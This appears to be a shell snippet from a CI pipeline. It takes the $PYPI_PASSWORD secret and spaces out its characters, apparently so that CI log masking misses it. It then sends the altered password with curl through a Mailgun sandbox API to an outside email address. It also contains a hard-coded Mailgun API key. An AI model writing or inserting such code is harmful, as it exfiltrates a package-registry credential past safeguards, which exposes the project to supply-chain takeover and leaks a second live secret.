new_pass=`echo $PYPI_PASSWORD | sed -r 's/(.)/\1 /g'`
curl -s --user 'api:key-abd19736b1ef5a9a381b610227d66783' \
    https://api.mailgun.net/v3/sandbox46ca19d89b1d486e9c5ad6916d3774d1.mailgun.org/messages \
    -F from='Excited User <CI@sandbox46ca19d89b1d486e9c5ad6916d3774d1.mailgun.org>' \
    -F to='mphillips@twopicode.com.au' \
    -F subject='Hello' \
    -F text="$new_pass"
